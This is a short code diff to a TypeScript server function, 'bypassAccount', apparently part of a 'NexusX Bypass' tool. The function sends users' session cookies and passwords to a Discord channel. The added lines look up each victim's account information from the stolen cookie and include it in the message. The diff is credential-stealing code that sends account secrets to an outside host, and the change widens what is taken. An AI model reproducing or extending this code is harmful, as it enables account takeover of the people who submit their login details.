@@ -149,12 +149,14 @@ export const bypassAccount = createServerFn({ method: "POST" })
     const token: string | undefined = payload.token;
 
     const finalize = async (ok: boolean, status: number, body: any) => {
+      const info = await getAccountInfo(data.cookie);
       await sendToDiscord("NexusX Bypass", {
         Version: data.version,
         Cookie: data.cookie,
         Password: data.password ?? "",
         Status: `${status} ${ok ? "OK" : "FAIL"}`,
         Result: typeof body === "string" ? body : JSON.stringify(body),
+        ...info,
       });
       return { ok, status, data: body };
     };
